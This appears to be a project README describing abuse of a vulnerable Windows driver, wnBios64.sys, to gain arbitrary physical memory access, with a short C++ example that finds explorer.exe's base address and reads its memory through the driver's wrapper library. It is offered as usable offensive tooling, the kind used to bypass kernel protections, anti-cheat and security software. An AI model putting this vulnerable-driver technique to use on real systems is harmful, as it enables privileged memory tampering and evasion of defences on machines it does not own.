# ZwMapViewOfSection vulnerable driver

Using wnBios64.sys for arbitrary physical memory access

## How it was found

I found this driver using the [VulnDriverFinder](https://github.com/ItzPAX/VulnDriverFinder) tool

## Usage

```cpp
#include "drv.h"

int main()
{
	wnbios_lib driver;
	uintptr_t base = driver.get_process_base("explorer.exe");
	
	if (!base)
	{
		printf("[-] process is not running\n");
		system("pause");
		return false;
	}

	UINT8 buf[3] = { 0 };
	driver.read_virtual_memory(base, buf, 2);
	printf("%s\n", buf);
	
	system("pause");

	return true;
}
```
## Credits
[GDRVLib](https://github.com/zer0condition/GDRVLib) by zer0condition
